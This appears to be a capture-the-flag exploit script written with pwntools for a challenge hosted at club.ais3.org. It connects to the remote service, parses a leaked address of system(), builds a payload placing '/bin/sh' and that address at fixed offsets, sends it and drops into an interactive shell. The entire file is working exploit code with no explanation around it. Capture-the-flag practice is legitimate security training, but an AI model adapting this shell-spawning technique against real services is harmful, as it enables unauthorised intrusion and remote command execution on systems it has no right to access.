#!/usr/bin/env python
from pwn import *
import pwnlib.elf

c = remote('club.ais3.org', 5001)
#c = process('chal')
context.log_level ='debug'

# gdb
# gdb.attach(c)
context.arch='amd64'

c.recvuntil('system(): ')
system_func = int(c.recvuntil('\n')[:-1], 16)
print(system_func)

ans = flat({0: '/bin/sh', 0x10: p64(system_func)}, filler = b'\0')
c.sendline(ans)
c.interactive()
c.close()
